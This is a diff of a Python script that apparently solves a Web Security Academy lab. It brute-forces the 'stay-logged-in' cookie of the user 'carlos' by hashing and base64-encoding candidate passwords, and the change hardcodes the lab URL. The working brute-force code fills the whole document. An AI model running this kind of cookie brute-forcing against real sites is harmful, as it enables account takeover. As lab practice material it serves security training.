@@ -19,10 +19,10 @@ def access_carlos_account(url):
                 password.rstrip('\r\n').encode("utf-8")).hexdigest()
             encoded_password = base64.b64encode(
                 bytes(hashed_password, "utf-8"))
-            clear_password = encoded_password.decode("utf-8")
+            decoded_password = encoded_password.decode("utf-8")
             response  = requests.Session()
             myaccount_url = url + "/my-account"
-            cookies = {'stay-logged-in': clear_password}
+            cookies = {'stay-logged-in': decoded_password}
             request = response.get(
                 myaccount_url,
                 cookies=cookies,
@@ -34,7 +34,7 @@ def access_carlos_account(url):
 
 if __name__ == "__main__":
     try:
-        url = sys.argv[1]
+        url = "https://0a4e007304c3dc3b83190a1900af00f5.web-security-academy.net/"
         print("(+) Brute-forcing Carlos's password...")
         password = access_carlos_account(url)
         print("[+] Carlos's password is '%s'" % password)
